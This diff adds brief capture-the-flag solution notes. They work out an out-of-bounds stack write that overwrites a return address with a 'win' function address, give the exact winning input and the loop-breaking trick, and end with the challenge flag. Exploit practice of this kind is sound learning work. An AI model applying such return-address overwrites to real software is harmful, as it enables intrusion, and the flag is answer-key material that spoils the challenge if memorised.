@@ -1,0 +1,17 @@
+RBP + v3 * 0x8 - 0x60 = v1 + v2 
+
+V1 + v2 must be win address --> v1 = 0x400822 = 4196386 v2 = 0x0 = 0
+
+SET TOP OF STACK POINTER AT RET TO WIN ADDRESS
+RBP_AT_WRITE = RSP_AT_LEAVE - 0x8 
+
+--> v3 * 0x8 - 0x60 must be 0x8
+--> v3 = (0x8 + 0x60) / 8 = 13
+
+
+--> winning input = 4196386 0 13
+
+Break loop with invalid input e.g.: a
+
+
+FLAG{easy_00b_write} -- flag
